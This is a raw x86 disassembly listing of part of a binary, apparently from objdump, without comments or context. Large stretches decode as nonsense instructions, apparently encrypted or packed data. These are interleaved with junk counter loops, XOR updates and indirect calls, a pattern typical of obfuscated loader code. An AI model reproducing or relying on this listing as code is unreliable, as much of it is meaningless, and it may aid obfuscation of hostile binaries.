  406c04:	mov    bh,BYTE PTR [edi+0x7e]
  406c07:	jle    0x406bc4
  406c09:	add    bl,0xc3
  406c0c:	push   es
  406c0d:	cmp    edi,DWORD PTR [eax+0x4f8bbbc1]
  406c13:	push   ebp
  406c14:	loop   0x406c33
  406c16:	out    dx,al
  406c17:	shl    BYTE PTR [eax],0x2c
  406c1a:	pushf  
  406c1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c1c:	jmp    0x406c89
  406c1e:	in     eax,0x23
  406c20:	pop    edi
  406c21:	xchg   esp,eax
  406c22:	add    DWORD PTR [di],esp
  406c25:	push   es
  406c26:	xor    bl,BYTE PTR [edi+0x15]
  406c29:	sbb    DWORD PTR [esi-0x1c],esi
  406c2c:	dec    esp
  406c2d:	jo     0x406bfd
  406c2f:	shr    DWORD PTR [eax-0x58c9727a],1
  406c35:	push   esp
  406c36:	adc    edx,esi
  406c38:	dec    edi
  406c39:	adc    eax,0x224cee70
  406c3e:	fs test dl,bh
  406c41:	js     0x406bde
  406c43:	push   ss
  406c44:	popf   
  406c45:	jle    0x406c4b
  406c47:	test   al,0xb5
  406c49:	jno    0x406bd8
  406c4b:	rcl    bl,1
  406c4d:	retf   
  406c4e:	ret    
  406c4f:	test   al,0x24
  406c51:	cs out dx,eax
  406c53:	ds int3 
  406c55:	iret   
  406c56:	or     ecx,DWORD PTR [esi]
  406c58:	sub    eax,0xb03d19ba
  406c5d:	cs adc al,0xe3
  406c60:	sbb    esi,ecx
  406c62:	in     eax,0x4d
  406c64:	dec    esp
  406c65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c66:	imul   edi,DWORD PTR [ebp-0xf4d2f],0x5e826273
  406c70:	inc    ebp
  406c71:	xchg   DWORD PTR [edi-0x4d686b29],edi
  406c77:	adc    eax,0x1df52e9e
  406c7c:	mov    al,ds:0xe5294e55
  406c81:	repnz nop
  406c83:	cmc    
  406c84:	sub    DWORD PTR [ecx],ecx
  406c86:	aaa    
  406c87:	xchg   esp,eax
  406c88:	dec    eax
  406c89:	and    bh,BYTE PTR [ebp+0x3ef72ac2]
  406c8f:	mov    edi,0x53764774
  406c94:	pusha  
  406c95:	int    0x58
  406c97:	xchg   cl,dh
  406c99:	loop   0x406c67
  406c9b:	test   al,0xb3
  406c9d:	and    dl,BYTE PTR [ebx-0x1e]
  406ca0:	int    0x6a
  406ca2:	xor    bl,ah
  406ca4:	sbb    bh,dh
  406ca6:	sar    al,cl
  406ca8:	out    0x9a,eax
  406caa:	adc    ebp,ebx
  406cac:	stos   BYTE PTR es:[edi],al
  406cad:	sti    
  406cae:	addr16 jle 0x406c5d
  406cb1:	sub    bh,al
  406cb3:	jp     0x406c85
  406cb5:	mov    dh,0x5a
  406cb7:	push   es
  406cb8:	sbb    DWORD PTR [ebp-0x19af52a2],ecx
  406cbe:	xor    eax,0x2bb44e5d
  406cc3:	pop    edx
  406cc4:	lods   al,BYTE PTR ds:[esi]
  406cc5:	cmc    
  406cc6:	push   0x9
  406cc8:	sub    DWORD PTR ds:[eax-0x18],esi
  406ccc:	sbb    esi,DWORD PTR [ecx+esi*2+0x250c56ec]
  406cd3:	adc    BYTE PTR [edi+0x1f7229aa],al
  406cd9:	or     DWORD PTR [eax],esp
  406cdb:	mov    dl,0xa2
  406cdd:	and    ah,bl
  406cdf:	inc    ebp
  406ce0:	out    dx,eax
  406ce1:	mov    bh,0x34
  406ce3:	push   es
  406ce4:	xor    al,0xa1
  406ce6:	out    0x18,eax
  406ce8:	loope  0x406d60
  406cea:	xchg   edi,eax
  406ceb:	dec    esp
  406cec:	arpl   ax,dx
  406cee:	cmp    al,0x43
  406cf0:	xlat   BYTE PTR ds:[ebx]
  406cf1:	ret    0x9b72
  406cf4:	inc    esi
  406cf5:	dec    edx
  406cf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cf7:	(bad)  
  406cf8:	mov    esp,DWORD PTR [edi-0x37]
  406cfb:	adc    ah,bl
  406cfd:	jae    0x406c98
  406cff:	mov    ecx,0x4b3b945f
  406d04:	mov    ds:0x47b012df,al
  406d09:	mov    dl,0x30
  406d0b:	pop    esp
  406d0c:	leave  
  406d0d:	pushf  
  406d0e:	mov    eax,ds:0x693cfcb5
  406d13:	arpl   WORD PTR [ebp-0x59f20dc8],bx
  406d19:	pop    ds
  406d1a:	jecxz  0x406cc4
  406d1c:	pop    ecx
  406d1d:	addr16 mov ah,0x68
  406d20:	loop   0x406cb4
  406d22:	xchg   edx,eax
  406d23:	sub    eax,0xe0df452f
  406d28:	or     BYTE PTR [esi+eax*4-0x40],ah
  406d2c:	das    
  406d2d:	sar    bl,1
  406d2f:	scas   al,BYTE PTR es:[edi]
  406d30:	pop    ds
  406d31:	xlat   BYTE PTR ds:[ebx]
  406d32:	std    
  406d33:	je     0x406d61
  406d35:	jmp    0xded4:0x28624003
  406d3c:	add    eax,0x5a2bc4e0
  406d41:	out    0x55,eax
  406d43:	adc    al,0xda
  406d45:	inc    ebp
  406d46:	test   DWORD PTR [eax+0x2c],0xf6857b5f
  406d4d:	int3   
  406d4e:	mov    dl,BYTE PTR [ecx]
  406d50:	out    0x90,al
  406d52:	les    ebx,FWORD PTR [ebp+0x463d8ae6]
  406d58:	push   0xfffffffa
  406d5a:	ror    bl,cl
  406d5c:	sar    DWORD PTR [edi+eax*2],0xd3
  406d60:	mov    esi,0x9ff24a13
  406d65:	dec    ebp
  406d66:	in     eax,0x76
  406d68:	xchg   esp,eax
  406d69:	lahf   
  406d6a:	test   DWORD PTR [esi+0x4b3c79bc],esi
  406d70:	or     dh,ah
  406d72:	sbb    eax,0x5378425b
  406d77:	mov    dl,0xfa
  406d79:	push   ebp
  406d7a:	fidivr WORD PTR [edx+0x1ec405eb]
  406d80:	cmp    al,0x2f
  406d82:	inc    ebp
  406d83:	and    BYTE PTR [edx-0x77],0xa7
  406d87:	push   es
  406d88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d89:	dec    esi
  406d8a:	jmp    0x222a:0xf3ed88a3
  406d91:	in     al,0xf
  406d93:	adc    edi,DWORD PTR [edi+eiz*1]
  406d96:	call   0x36e:0xba180d2f
  406d9d:	rol    DWORD PTR [ecx+0x43035f25],1
  406da3:	add    BYTE PTR [eax],al
  406da5:	add    BYTE PTR [eax],al
  406da7:	add    BYTE PTR [ebx+0x43035f3d],cl
  406dad:	add    BYTE PTR [edi-0x77],al
  406db0:	cmp    eax,0x43035f
  406db5:	cmp    DWORD PTR ds:0x43035f,0xa
  406dbc:	jne    0x406dcb
  406dc2:	push   DWORD PTR [ebp-0x1c]
  406dc5:	call   DWORD PTR ds:0x42eaa3
  406dcb:	cmp    DWORD PTR ds:0x43035f,0x9
  406dd2:	jne    0x406de7
  406dd8:	xor    edi,edi
  406dda:	or     edi,DWORD PTR ds:0x43035f
  406de0:	inc    edi
  406de1:	mov    DWORD PTR ds:0x43035f,edi
  406de7:	cmp    DWORD PTR ds:0x43035f,0x19
  406dee:	jb     0x406da8
  406df4:	xor    DWORD PTR ds:0x42e640,edx
  406dfa:	jmp    0x406fab
  406dff:	xchg   BYTE PTR [ebx+0x34],bl
  406e02:	sahf   
  406e03:	icebp  
  406e04:	jno    0x406d9a
  406e06:	arpl   WORD PTR [ecx+0x5fb88485],si
  406e0c:	lock mov dl,0x7c
  406e0f:	icebp  
  406e10:	cmp    BYTE PTR [esi+0x7e],bh
  406e13:	mov    bh,BYTE PTR [edi+0x7e]
  406e16:	jle    0x406e6e
  406e18:	pop    ds
  406e19:	mov    dl,0x19
  406e1b:	aas    
  406e1c:	inc    eax
  406e1d:	jae    0x406e71
  406e1f:	sbb    BYTE PTR [ebp-0xa3c67b2],bh
  406e25:	mov    dh,0x48
  406e27:	add    bh,bl
  406e29:	loope  0x406e91
  406e2b:	fwait
  406e2c:	(bad)  
  406e2d:	mov    eax,0x7fa1f115
  406e32:	ret    0x5326
  406e35:	cmc    
  406e36:	xor    BYTE PTR [esi-0x7febe247],dl
  406e3c:	inc    eax
  406e3d:	sbb    eax,0x4a7b1970
  406e42:	fistp  QWORD PTR [edi+0x512d9443]
  406e48:	push   esi
  406e49:	mov    esp,0xa498c8bd
  406e4e:	popf   
  406e4f:	shl    BYTE PTR [esi-0x6f6fd3c],1
  406e55:	jmp    0xa021cf35
  406e5a:	mov    al,ds:0x63a18d5b
  406e5f:	or     BYTE PTR [edi+0x59],cl
  406e62:	call   0xe4d1:0x43f8b988
  406e69:	adc    edi,DWORD PTR [esi+eiz*4+0x7a]
  406e6d:	pop    ebp
  406e6e:	jmp    0x5e6c:0xc40bdbcd
  406e75:	repnz and ebp,DWORD PTR [ebx-0x15]
  406e79:	jge    0x406ee4
  406e7b:	stos   BYTE PTR es:[edi],al
  406e7c:	sub    dh,BYTE PTR [edx-0x3e]
  406e7f:	mov    edx,0xd9838760
  406e84:	(bad)  
  406e85:	cmp    BYTE PTR [eax+0x17],dh
  406e88:	shl    dh,1
  406e8a:	inc    edi
  406e8b:	stos   BYTE PTR es:[edi],al
  406e8c:	pop    ebp
  406e8d:	(bad)  
  406e8f:	fcom   QWORD PTR [eax]
  406e91:	cbw    
  406e93:	inc    edi
  406e94:	aaa    
  406e95:	inc    ebx
  406e96:	pop    es
  406e97:	cmp    eax,0x34b7b7d3
  406e9c:	popa   
  406e9d:	test   DWORD PTR [edi],ebp
  406e9f:	sub    edi,DWORD PTR [ebx+0x6f544c7e]
  406ea5:	arpl   bx,cx
  406ea7:	pushf  
  406ea8:	test   al,0xb9
  406eaa:	in     al,dx
  406eab:	mov    al,0x77
  406ead:	cli    
  406eae:	icebp  
  406eaf:	cli    
  406eb0:	leave  
  406eb1:	mov    al,0xf2
  406eb3:	inc    ecx
  406eb4:	test   al,0xc1
  406eb6:	ins    BYTE PTR es:[edi],dx
  406eb7:	out    dx,al
  406eb8:	add    eax,0x6b06acd1
  406ebd:	arpl   WORD PTR [edx],ax
  406ebf:	aam    0x26
  406ec1:	inc    edi
  406ec2:	fwait
  406ec3:	int3   
  406ec4:	fwait
  406ec5:	mov    bh,0x7b
  406ec7:	lds    eax,FWORD PTR [edi+0xe]
  406eca:	sub    edi,DWORD PTR [edi-0x63]
  406ecd:	and    DWORD PTR [ebx-0x6a9ea6d],edi
  406ed3:	mov    ds:0x41891abc,eax
  406ed8:	pop    ebp
  406ed9:	dec    eax
  406eda:	ret    
  406edb:	jb     0x406e7e
  406edd:	faddp  st(1),st
  406edf:	dec    edi
  406ee0:	je     0x406ed0
  406ee2:	mov    edx,0x5ae3fdec
  406ee7:	mov    BYTE PTR [esi-0x2d01dcd2],0x30
  406eee:	outs   dx,BYTE PTR ds:[esi]
  406eef:	neg    DWORD PTR [esi]
  406ef1:	dec    edi
  406ef2:	lea    eax,[ebp+0x53]
  406ef5:	jmp    0x42bb37a2
  406efa:	das    
  406efb:	mov    ds:0xb28c11e5,eax
  406f00:	cmp    eax,eax
  406f02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f03:	sub    dh,ch
  406f05:	leave  
  406f06:	xchg   esp,eax
  406f07:	or     DWORD PTR [ebx],edi
  406f09:	push   ebp
  406f0a:	scas   al,BYTE PTR es:[edi]
  406f0b:	pop    eax
  406f0c:	repz rol DWORD PTR [ebx+edi*1],0xe0
  406f11:	jbe    0x406f53
  406f13:	popa   
  406f14:	adc    al,0x71
  406f16:	push   cs
  406f17:	push   0x5d
  406f19:	retf   
  406f1a:	(bad)  
  406f1b:	dec    edi
  406f1c:	fisttp DWORD PTR [ebx+0x541cecf5]
  406f22:	std    
  406f23:	push   es
  406f24:	out    0xb4,al
  406f26:	fmul   DWORD PTR [ebp+0x59eeeba]
  406f2c:	enter  0xcf1f,0xa4
  406f30:	and    edx,esi
  406f32:	mov    esi,0xd62b28ac
  406f37:	dec    ebx
  406f38:	mov    BYTE PTR [esi+0x6031bfc4],ch
  406f3e:	outs   dx,BYTE PTR ds:[esi]
  406f3f:	aas    
  406f40:	sub    ecx,0x1a
  406f43:	cs adc eax,0xdc17e7b1
  406f49:	test   BYTE PTR [ebx+edi*4+0x53d5b5e7],bh
  406f50:	dec    eax
  406f51:	inc    esi
  406f52:	mov    edi,0x6fb07e81
  406f57:	pop    ebp
  406f58:	(bad)  
  406f59:	sub    al,0x60
  406f5b:	xchg   ecx,eax
  406f5c:	sbb    DWORD PTR [ecx],esp
  406f5e:	or     DWORD PTR [ecx-0x6736ccf4],eax
  406f64:	sub    ch,BYTE PTR [esi-0x73]
  406f67:	mov    eax,ds:0x9de79c38
  406f6c:	and    esp,DWORD PTR [eax+0x20]
  406f6f:	pushf  
  406f70:	(bad)  
  406f71:	in     al,dx
  406f72:	aad    0xd7
  406f74:	mov    esp,DWORD PTR [esi-0x23]
  406f77:	inc    eax
  406f78:	jbe    0x406f4c
  406f7a:	jmp    0x89ffa9fb
  406f7f:	rcl    BYTE PTR [ebx-0x37],1
  406f82:	xchg   ebp,eax
  406f83:	(bad)  
  406f84:	and    esi,esi
  406f86:	fistp  QWORD PTR [ebp-0x22]
  406f89:	sub    dh,al
  406f8b:	xor    DWORD PTR [eax+0x1e],ebp
  406f8e:	cwde   
  406f8f:	pop    ebx
  406f90:	repz mov al,0xa1
  406f93:	jmp    0xcba:0x33b90ccc
  406f9a:	or     ebp,0x6a8e355e
  406fa0:	hlt    
  406fa1:	dec    ecx
  406fa2:	dec    esp
  406fa3:	push   es
  406fa4:	xchg   edi,eax
  406fa5:	mov    al,ds:0x9df2d7ae
  406faa:	into   
  406fab:	mov    DWORD PTR [ebp-0x8],edx
  406fae:	mov    edx,DWORD PTR [ebp+0x8]
  406fb1:	xor    edi,DWORD PTR ds:0x4302e5
  406fb7:	xor    edx,eax
  406fb9:	add    edx,ecx
  406fbb:	xor    DWORD PTR ds:0x4302c5,edi
  406fc1:	jmp    0x407172
  406fc6:	sub    DWORD PTR [ebx],ecx
  406fc8:	fnstsw WORD PTR [esi]
  406fca:	fucomp st(0)
  406fcc:	sub    ecx,ebp
  406fce:	cmp    DWORD PTR ds:0x4d873d82,edx
  406fd4:	xchg   BYTE PTR [edx+0xd],ch
  406fd7:	(bad)  
  406fd8:	jle    0x407058
  406fda:	mov    bh,BYTE PTR [edi+0x7e]
  406fdd:	jle    0x406fde
  406fdf:	or     eax,0x356a9dc2
  406fe4:	push   0x3c3883a9
  406fe9:	mov    ss,edx
  406feb:	cdq    
  406fec:	mov    eax,ds:0x8c96dc58
  406ff1:	retf   0x7c48
  406ff4:	push   esi
  406ff5:	or     al,0x56
  406ff7:	lock xchg ebp,eax
  406ff9:	and    DWORD PTR [edi-0x35],edi
  406ffc:	sbb    al,0xf4
  406ffe:	pop    ecx
  406fff:	dec    ecx
  407000:	std    
  407001:	sbb    eax,0x491661c4
  407006:	addr16 mov edx,0x7776c9e8
  40700c:	inc    ecx
  40700d:	dec    ebx
  40700e:	xor    al,0x96
  407010:	pop    es
  407011:	sub    eax,DWORD PTR [ebp-0x65815e58]
  407017:	nop
  407018:	cld    
  407019:	jne    0x40705b
  40701b:	cld    
  40701c:	jg     0x406fa1
  40701e:	jl     0x407086
  407020:	pop    ebp
  407021:	mov    ecx,0xd5e5d27
  407026:	xchg   DWORD PTR [eax-0x7d17b5b1],ecx
  40702c:	ror    DWORD PTR [ebp-0x68409c40],cl
  407032:	mov    esp,0x5a6e102b
  407037:	vmread DWORD PTR [ebx+edi*4-0x2771aa0e],esp
  40703f:	jns    0x407038
  407041:	imul   esi,DWORD PTR [edi+0x75eb7b09],0x54
  407048:	sbb    cl,BYTE PTR [edx]
  40704a:	and    BYTE PTR [eax-0x39],0x78
  40704e:	sub    edx,esi
  407050:	fdivr  QWORD PTR [ebp-0x7ae7e12e]
  407056:	test   DWORD PTR [ecx-0x16],ecx
  407059:	adc    al,0xb6
  40705b:	enter  0xabbc,0xce
  40705f:	sbb    ebx,ecx
  407061:	or     esi,DWORD PTR [edi+0x66]
  407064:	mov    al,al
  407066:	cli    
  407067:	adc    eax,0xc844b41f
  40706c:	push   0x7f567b38
  407071:	icebp  
  407072:	(bad)  [edi+0x48]
  407075:	cmp    dh,BYTE PTR [edx+0x216c300d]
  40707b:	into   
  40707c:	into   
  40707d:	push   ecx
  40707e:	cmp    eax,0x1f5bd9f6
  407083:	mov    ah,0x2c
  407085:	aad    0xdd
  407087:	int3   
  407088:	shl    BYTE PTR [ebp+0x7bc6321a],cl
  40708e:	mov    WORD PTR [edi],cs
  407090:	rcl    ah,0xab
  407093:	inc    ebx
  407094:	jl     0x4070d9
  407096:	fsubp  st(4),st
  407098:	sbb    bh,BYTE PTR fs:[edx-0x8bb65a6]
  40709f:	xchg   ebx,eax
  4070a0:	hlt    
  4070a1:	inc    edi
  4070a2:	xabort 0x5d
  4070a5:	add    bh,BYTE PTR [edi-0x34]
  4070a8:	aaa    
  4070a9:	out    dx,al
  4070aa:	jbe    0x40704c
  4070ac:	adc    esp,DWORD PTR [ecx-0x4dbc6134]
  4070b2:	lea    edi,[eax+0x51dda502]
  4070b8:	dec    edx
  4070b9:	retf   0x6f60
  4070bc:	mov    fs,WORD PTR ds:0x325610ec
  4070c2:	dec    eax
  4070c3:	sar    BYTE PTR [edx-0x2e],cl
  4070c6:	mov    ds:0x34c545cf,al
  4070cb:	out    dx,al
  4070cc:	ins    BYTE PTR es:[edi],dx
  4070cd:	jecxz  0x40713e
  4070cf:	inc    eax
  4070d0:	mov    cl,0x25
  4070d2:	sbb    DWORD PTR [edi-0x3a],ecx
  4070d5:	stos   BYTE PTR es:[edi],al
  4070d6:	add    DWORD PTR [esi+edi*4+0x3],ebx
  4070da:	test   al,0xcc
  4070dc:	gs call 0xe4a0:0xc1637edc
  4070e4:	out    dx,al
  4070e5:	cs nop
  4070e7:	jmp    0x31c7:0xcdccc601
  4070ee:	sbb    ebp,edi
  4070f0:	mov    esp,0x3dc00b69
  4070f5:	mov    eax,ds:0xad21ca0c
  4070fa:	repnz std 
  4070fc:	popf   
  4070fd:	test   BYTE PTR [eax],dl
  4070ff:	repnz loope 0x4070f3
  407102:	inc    ecx
  407103:	xchg   edi,eax
  407104:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407105:	sub    ecx,DWORD PTR [ebx+0x3bce207]
  40710b:	mov    ds:0xa49327f4,al
  407110:	pop    ebp
  407111:	outs   dx,BYTE PTR ds:[esi]
  407112:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  407114:	sub    bl,cl
  407116:	sbb    esi,edx
  407118:	(bad)  
  407119:	and    BYTE PTR [edx-0x3078e6cc],ch
  40711f:	inc    esp
  407120:	inc    ebp
  407121:	imul   edx,DWORD PTR [ecx-0x2ba2c303],0x146128fb
  40712b:	cwde   
  40712c:	cwde   
  40712d:	cld    
  40712e:	loopne 0x4070d0
  407130:	mov    esi,0x87b29df3
  407135:	xchg   esi,eax
  407136:	fild   WORD PTR [ecx+0x45df7167]
  40713c:	fwait
  40713d:	adc    bl,BYTE PTR [ebx-0x1a407c0d]
  407143:	and    al,0x82
  407145:	sbb    esi,DWORD PTR [edx+esi*8+0x77c12ea4]
  40714c:	test   eax,0xcc3a6561
  407151:	ret    0xa9ff
  407154:	pop    ss
  407155:	mov    edx,gs
  407157:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407158:	bound  ebp,QWORD PTR [esi]
  40715a:	and    DWORD PTR [edx+0x7a],0x6517d02c
  407161:	mov    ch,0x2
  407163:	add    eax,0xeea35863
  407168:	mov    edx,0x7bed6582
  40716d:	pop    eax
  40716e:	fs loop 0x407173
  407171:	nop
  407172:	mov    DWORD PTR [ebp+0xc],edx
  407175:	and    DWORD PTR ds:0x42e640,0x0
  40717f:	jmp    0x407191
  407184:	mov    edi,DWORD PTR ds:0x42e640
  40718a:	inc    edi
  40718b:	mov    DWORD PTR ds:0x42e640,edi
  407191:	cmp    DWORD PTR ds:0x42e640,0x1a
  407198:	jae    0x4071c1
  40719e:	cmp    DWORD PTR ds:0x42e640,0x28
  4071a5:	jne    0x4071b6
  4071ab:	push   0x716b
  4071b0:	call   DWORD PTR ds:0x42e92b
  4071b6:	jmp    0x407184
  4071bb:	and    DWORD PTR ds:0x4302e9,edi
  4071c1:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  4071c8:	adc    edi,DWORD PTR ds:0x4302cd
  4071ce:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  4071d5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4071dc:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4071e3:	and    DWORD PTR ds:0x4302e1,0x0
  4071ed:	mov    edi,DWORD PTR ds:0x4302e1
  4071f3:	inc    edi
  4071f4:	mov    DWORD PTR ds:0x4302e1,edi
  4071fa:	cmp    DWORD PTR ds:0x4302e1,0x6
  407201:	jne    0x407247
  407207:	push   0x42e7a9
  40720c:	push   DWORD PTR [ebp-0x14]
  40720f:	push   0x2c1e
  407214:	push   0x5ddb
  407219:	push   DWORD PTR [ebp-0x20]
  40721c:	push   0x67ee
  407221:	push   DWORD PTR [ebp-0x18]
  407224:	push   DWORD PTR [ebp-0x24]
  407227:	push   DWORD PTR [ebp-0x14]
  40722a:	push   0x21a8
  40722f:	push   0x81f6
  407234:	push   0x1b91
  407239:	push   0x8bde
  40723e:	push   DWORD PTR [ebp-0x28]
  407241:	call   DWORD PTR ds:0x42e92f
  407247:	cmp    DWORD PTR ds:0x4302e1,0x5
  40724e:	jne    0x407261
  407254:	mov    edi,DWORD PTR ds:0x4302e1
  40725a:	inc    edi
  40725b:	mov    DWORD PTR ds:0x4302e1,edi
  407261:	cmp    DWORD PTR ds:0x4302e1,0x12
  407268:	jb     0x4071ed
  40726e:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  407275:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40727c:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  407283:	mov    edx,DWORD PTR [ebp+0x8]
  407286:	xor    edi,edi
  407288:	add    edi,DWORD PTR ds:0x42e63c
  40728e:	or     DWORD PTR ds:0x4302e5,edi
  407294:	jmp    0x407445
  407299:	mov    edx,0xad140ee9
  40729e:	icebp  
  40729f:	inc    eax
  4072a0:	jno    0x4072e6
  4072a2:	mov    eax,ds:0xf4b73f15
  4072a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072a8:	ins    BYTE PTR es:[edi],dx
  4072a9:	cdq    
  4072aa:	(bad)  
  4072ab:	jle    0x40732b
  4072ad:	mov    bh,BYTE PTR [edi+0x7e]
  4072b0:	jle    0x4072f8
  4072b2:	hlt    
  4072b3:	push   edx
  4072b4:	add    eax,0xcfe4705e
  4072b9:	rol    DWORD PTR [eax],1
  4072bb:	xchg   ebx,eax
  4072bc:	push   edi
  4072bd:	mov    ah,0x90
  4072bf:	lock cmp al,0x93
  4072c2:	in     al,dx
  4072c3:	pusha  
  4072c4:	jmp    0x4072da
  4072c6:	in     eax,0xb2
  4072c8:	sti    
  4072c9:	or     al,BYTE PTR [ecx+0x438d1bde]
  4072cf:	fs call 0x5d5c:0x9000a904
  4072d7:	push   edx
  4072d8:	sub    eax,0x1df5bc99
  4072dd:	test   BYTE PTR [edx],ch
  4072df:	in     al,0x28
  4072e1:	(bad)  
  4072e2:	lahf   
  4072e3:	arpl   WORD PTR [eax+0x47],sp
  4072e6:	push   0xffffff8a
  4072e8:	xchg   bh,bh
  4072ea:	jnp    0x40730f
  4072ec:	add    DWORD PTR [esi+0x1f50c250],ebp
  4072f2:	retf   0x559b
  4072f5:	daa    
  4072f6:	push   0xbf79684b
  4072fb:	or     BYTE PTR [ebp-0x7d5cd1e],bl
  407301:	dec    esp
  407302:	ds dec ebx
  407304:	ret    
  407305:	mov    edx,0xd8752ad8
  40730a:	and    dh,BYTE PTR [edi+0x10]
  40730d:	imul   esp,DWORD PTR [ebx+0x4a],0x6c
  407311:	mov    ebp,DWORD PTR [edi]
  407313:	gs xchg esi,eax
  407315:	and    eax,0xac21a3ef
  40731a:	xor    al,0xe2
  40731c:	adc    al,0x29
  40731e:	les    ebx,FWORD PTR [edx-0x5938f60a]
  407324:	push   esi
  407325:	xor    DWORD PTR [ebx-0xb],esi
  407328:	dec    ebx
  407329:	dec    ecx
  40732a:	or     BYTE PTR [ecx],ah
  40732c:	das    
  40732d:	loopne 0x4072ca
  40732f:	in     al,dx
  407330:	call   0x5072763d
  407335:	ret    
  407336:	aaa    
  407337:	or     eax,0x3519078b
  40733c:	pop    esp
  40733d:	pop    ecx
  40733e:	das    
  40733f:	dec    esi
  407340:	cwde   
  407341:	lock pop es
  407343:	mov    ecx,esp
  407345:	dec    ebx
  407346:	adc    eax,0x90c86718
  40734b:	enter  0x93d,0x51
  40734f:	cmp    eax,0x7dcbe8d6
  407354:	add    eax,0x266ab26c
  407359:	cmp    al,0x4f
  40735b:	adc    al,0x79
  40735d:	loope  0x4073bb
  40735f:	ficom  DWORD PTR [ebx-0x2085b039]
  407365:	hlt    
  407366:	scas   al,BYTE PTR es:[edi]
  407367:	mov    ecx,0x2fd46519
  40736c:	popf   
  40736d:	sub    bl,BYTE PTR [ebx-0x7ccf9198]
  407373:	pop    esp
  407374:	fild   WORD PTR [edx]
  407376:	das    
  407377:	push   edi
  407378:	adc    cl,BYTE PTR [ebp-0x43]
  40737b:	jle    0x407304
  40737d:	leave  
  40737e:	call   0x69fe76e4
  407383:	icebp  
  407384:	adc    ebp,DWORD PTR [esi-0x6a]
  407387:	mov    al,ds:0xecf8512e
  40738c:	pop    edx
  40738d:	lods   eax,DWORD PTR ds:[esi]
  40738e:	ror    DWORD PTR [ebp+0x39ecd2a8],1
  407394:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407395:	sbb    BYTE PTR [eax+0x28],bh
  407398:	in     eax,0x53
  40739a:	jnp    0x4073e4
  40739c:	jnp    0x407409
  40739e:	mov    ds:0x51cbe98a,al
  4073a3:	shl    BYTE PTR [esi+edx*1+0x3d760d7],0x2
  4073ab:	mov    ch,0xea
  4073ad:	cdq    
  4073ae:	inc    esp
  4073af:	sub    esp,DWORD PTR [edx-0x23a92561]
  4073b5:	lock jo 0x407339
  4073b8:	data16 jmp 0x40740d
  4073bb:	mov    esi,0x65bd87e0
  4073c0:	test   DWORD PTR [ecx],ebp
  4073c2:	int    0xe6
  4073c4:	cmp    ecx,eax
  4073c6:	cmp    eax,0x605379e8
  4073cb:	xlat   BYTE PTR ds:[ebx]
  4073cc:	adc    edi,DWORD PTR [ecx]
  4073ce:	cld    
  4073cf:	inc    edi
  4073d0:	push   ebx
  4073d1:	xchg   ecx,eax
  4073d2:	test   eax,0xa24c50d6
  4073d7:	retf   0x11e0
  4073da:	xchg   ebx,eax
  4073db:	xchg   esp,eax
  4073dc:	push   esi
  4073dd:	stos   BYTE PTR es:[edi],al
  4073de:	in     eax,dx
  4073df:	rol    BYTE PTR [ecx+eiz*4-0x6],1
  4073e3:	mov    dl,ch
  4073e5:	push   eax
  4073e6:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073e8:	test   al,0x52
  4073ea:	xor    al,0x36
  4073ec:	inc    esp
  4073ed:	lock in eax,dx
  4073ef:	(bad)  
  4073f0:	imul   edi,DWORD PTR [ebx+0x6ae53100],0xffffffce
  4073f7:	pop    ecx
  4073f8:	stos   DWORD PTR es:[edi],eax
  4073f9:	retf   
  4073fa:	sbb    eax,0x691d79de
  4073ff:	aad    0x41
  407401:	push   ss
  407402:	sub    BYTE PTR ds:0xd9f164d2,al
  407408:	add    edi,edi
  40740a:	inc    eax
  40740b:	pop    esp
  40740c:	sbb    dh,BYTE PTR [edx+0x1a93f7bd]
  407412:	aaa    
  407413:	cmp    eax,0xc7c356ef
  407418:	pop    ss
  407419:	test   al,0x9b
  40741b:	mov    esi,?
  40741d:	ss (bad) 
  40741f:	jle    0x407451
  407421:	adc    DWORD PTR [edx],ecx
  407423:	xchg   ebp,eax
  407424:	and    bl,dh
  407426:	mov    ds:0x7e5c50,al
  40742b:	sbb    al,dh
  40742d:	mov    ch,0x1f
  40742f:	pop    edx
  407430:	in     eax,0xfe
  407432:	push   ss
  407433:	ss xchg ecx,eax
  407435:	pop    edx
  407436:	sbb    esp,DWORD PTR ds:0x50401d03
  40743c:	clc    
  40743d:	push   ds
  40743e:	out    0xd1,al
  407440:	icebp  
  407441:	arpl   WORD PTR ds:0xd033475c,sp
  407447:	mov    edi,DWORD PTR [ebp-0x10]
  40744a:	or     DWORD PTR ds:0x430357,0x71a5
  407454:	add    edx,ecx
  407456:	mov    DWORD PTR ds:0x4302c9,0x5a49
  407460:	cmp    edi,edx
  407462:	mov    DWORD PTR ds:0x43034f,0x6748
  40746c:	jmp    0x40761d
  407471:	not    DWORD PTR [ebp+edx*8-0xca68ae7]
  407478:	push   eax
  407479:	jb     0x4074d4
  40747b:	out    dx,eax
  40747c:	or     BYTE PTR [ebx+0x3598eede],al
  407482:	lds    edi,FWORD PTR [esi+0x7e]
  407485:	mov    bh,BYTE PTR [edi+0x7e]
  407488:	jle    0x4074e6
  40748a:	stos   BYTE PTR es:[edi],al
  40748b:	push   edx
  40748c:	test   edx,edi
  40748e:	jl     0x4074ae
  407490:	sbb    DWORD PTR [ecx-0x45d8fa86],0xffffff85
  407497:	test   eax,0x9ba0db5d
  40749c:	out    dx,eax
  40749d:	or     DWORD PTR [eax-0x4f3582d9],0x69
  4074a4:	les    ecx,FWORD PTR [ecx-0x3a]
  4074a7:	fsub   DWORD PTR [edx-0xd]
  4074aa:	(bad)  
  4074ab:	in     eax,dx
  4074ac:	pop    ebx
  4074ad:	push   esp
  4074ae:	mov    ebx,0xa111043d
  4074b3:	aam    0xbf
